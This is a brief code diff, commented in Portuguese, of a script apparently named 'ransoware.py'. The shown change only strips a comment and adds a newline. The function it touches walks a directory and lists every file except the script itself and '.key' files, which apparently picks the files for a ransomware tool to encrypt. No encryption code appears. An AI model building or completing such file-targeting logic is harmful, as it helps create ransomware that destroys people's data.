@@ -21,7 +21,7 @@ def encontrar_arquivos(diretorio):
         for nome in arquivos:
             caminho = os.path.join(raiz, nome)
             if nome != "ransoware.py" and not nome.endswith(".key"):
-                lista.append(caminho)  # ✅ AGORA FUNCIONA
+                lista.append(caminho) 
     return lista
 
 
@@ -35,3 +35,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
